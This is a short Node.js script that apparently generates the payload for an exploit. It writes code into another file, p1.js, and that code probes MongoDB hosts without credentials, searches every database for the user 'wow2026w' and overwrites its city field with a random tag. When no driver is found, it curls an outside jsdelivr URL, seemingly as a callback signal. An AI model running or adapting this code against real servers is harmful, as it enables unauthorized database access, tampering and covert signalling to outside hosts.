const fs=require('fs');
const tag='MG'+Math.floor(Math.random()*90000+10000);
const code=`
const fs=require('fs'),cp=require('child_process');
const H=['mongo','mongodb','db','mongodb-0.mongodb','127.0.0.1'];
let drv=null; for(const p of ['/app/node_modules/mongodb','/app/node_modules/mongoose/node_modules/mongodb','mongodb','/app/node_modules/mongoose/node_modules/mongodb/node_modules/mongodb']){ try{drv=require(p);break}catch(e){} }
if(!drv){ cp.spawnSync('curl',['-s','-m','5','-o','/dev/null','https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/zz9']); process.exit(0) }
(async()=>{
 for(const h of H){
  const c=new drv.MongoClient('mongodb://'+h+':27017',{serverSelectionTimeoutMS:2000});
  try{ await c.connect() }catch(e){ continue }
  const dbs=await c.db().admin().listDatabases();
  for(const d of dbs.databases){ const db=c.db(d.name);
    try{ for(const col of (await db.listCollections().toArray()).map(x=>x.name)){
      const doc=await db.collection(col).findOne({username:'wow2026w'});
      if(doc){ await db.collection(col).updateOne({_id:doc._id},{$set:{city:'${tag}'}}); process.exit(0) }
    } }catch(e){}
  }
  await c.close();
 }
})();
`;
let t=fs.readFileSync('p1.js','utf8'); t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n'); fs.writeFileSync('p1.js',t); console.log('tag='+tag);
